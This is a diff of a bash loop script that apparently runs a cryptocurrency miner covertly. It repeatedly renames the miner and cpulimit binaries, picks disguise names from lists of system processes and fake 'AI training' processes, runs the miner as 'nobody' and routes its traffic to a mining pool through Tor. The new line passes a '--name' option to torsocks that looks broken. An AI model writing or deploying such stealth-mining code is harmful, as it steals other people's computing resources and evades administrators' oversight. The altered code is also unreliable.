@@ -30,9 +30,11 @@ while true; do
     rm -f /usr/sbin/$CURRENT_NAME
   fi
 
+  # List of valid system process names for disguising
   SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
   RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}
 
+  # List of AI training-related process names
   AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")
   RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}
   RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)
@@ -63,7 +65,7 @@ while true; do
   cp /usr/bin/cpulimit /usr/bin/$CPULIMIT_NAME
 
   echo "Restarting systemdd process with new name: $FINAL_NAME and cpulimit: $CPULIMIT_NAME"
-  sudo -u nobody /usr/bin/$CPULIMIT_NAME -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050 &
-
-  prctl --set-name "$RANDOM_SYSTEM_PROCESS"
+  sudo -u nobody /usr/bin/$CPULIMIT_NAME -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks --name "$RANDOM_SYSTEM_PROCESS" /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050 &
+  
+  # As prctl is not supported, no need for renaming the process, it is already handled.
 done
